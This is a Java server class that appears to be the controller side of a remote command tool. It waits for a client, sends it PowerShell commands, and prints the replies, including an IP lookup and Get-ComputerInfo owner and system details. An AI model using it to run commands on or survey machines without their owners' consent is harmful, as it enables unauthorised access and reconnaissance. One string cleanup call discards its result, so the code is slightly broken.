package connection;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;


public class Server {
	private Socket s;
	private ServerSocket ss;
	private DataOutputStream dout;
	private DataInputStream din;
	
	private int _port;
	
	public Server(int port){
		_port = port;
	}

	public void connect() throws IOException {
		ss = new ServerSocket(_port);
		System.out.println("Waiting for connection on port " + _port + "...");
		s = ss.accept();
		System.gc(); //Calls the garbage collector because of the previous function
		
		dout = new DataOutputStream(s.getOutputStream());
		din = new DataInputStream(s.getInputStream());
		
		System.out.println("Connected to " + getIp());
		System.out.println(getSysInfo());
	}
	
	public String send(String str) throws IOException {
		dout.writeUTF(str);
		dout.flush();
		
		return din.readUTF();
	}

	public void end() throws IOException {
		s.close();
		ss.close();
	}
	
	public boolean connectionIsOpen() {
		return !s.isClosed();
	}
	
	private String getIp() throws IOException {
		String ip = "[not found]";
		
		if(s.isConnected()) {
			dout.writeUTF(" ipconfig | Select-String -Pattern Wi-Fi -Context 0,4");
			dout.flush();
			ip = din.readUTF();
			String[] aux = ip.split("IPv4");
			ip = aux[1];
			aux = ip.split(":");
			ip = aux[1];
			ip.replaceAll("[\n\r]", "");
		}
		
		return ip;
	}
	
	private String getSysInfo() throws IOException {
		String sysInfo = "[not found]";
		
		if(s.isConnected()) {
			dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
			dout.flush();
			
			sysInfo = din.readUTF();
		}
		
		return sysInfo;
	}
}
